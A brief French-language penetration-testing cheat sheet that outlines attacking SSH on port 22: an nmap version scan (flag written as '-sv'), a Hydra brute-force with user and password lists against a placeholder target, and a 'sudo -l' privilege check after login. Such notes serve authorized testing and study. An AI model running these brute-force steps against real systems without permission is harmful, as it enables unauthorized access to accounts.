# Bruteforce SSH (Port 22)
Si une énumération d'utilisateurs a réussi, tentez un bruteforce avec Hydra.

## [1] Énumération
Identifiez la version SSH.
```bash
nmap -sv <target_ip> -p 22
```

## [2] Exploitation
Utilisez une liste d'utilisateurs courants (root, admin, user).
```bash
hydra -L users.txt -P passwords.txt <target_ip> ssh
```

## [3] Post-Exploitation
Une fois connecté, vérifiez les privilèges sudo.
```bash
sudo -l
```
